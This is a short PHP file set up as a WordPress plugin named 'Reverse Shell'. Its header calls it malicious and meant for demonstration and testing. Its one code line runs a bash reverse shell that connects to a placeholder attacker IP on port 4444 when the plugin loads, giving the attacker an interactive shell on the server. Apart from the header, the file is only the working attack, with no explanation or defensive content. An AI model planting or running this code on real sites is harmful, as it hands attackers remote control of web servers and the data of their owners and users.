<?php
/*
Plugin Name: Reverse Shell
Description: A malicious plugin for demonstration and testing purposes only.
Version: 1.0
Author: Bilel G.
*/

// Replace <ATTACKER IP> with the actual IP address of the attacker machine.
exec("/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER IP>/4444 0>&1'");
?>
